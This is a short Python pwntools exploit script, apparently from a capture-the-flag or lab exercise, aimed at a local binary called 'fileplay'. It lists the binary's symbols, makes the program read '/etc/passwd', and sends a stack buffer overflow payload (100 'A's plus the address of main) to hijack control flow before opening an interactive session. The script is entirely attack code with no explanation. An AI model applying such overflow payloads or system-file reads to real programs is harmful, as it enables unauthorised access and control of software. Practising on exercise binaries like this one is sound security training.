from pwn import *

e = ELF("./fileplay")
p = process("./fileplay")

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

print p.recv()
p.sendline("y")

print p.recv()
p.sendline("/etc/passwd")

print p.recv()
main = e.symbols['main']
payload = "A"*100 + p32(main)
p.sendline(payload)

print p.recv()
p.interactive()
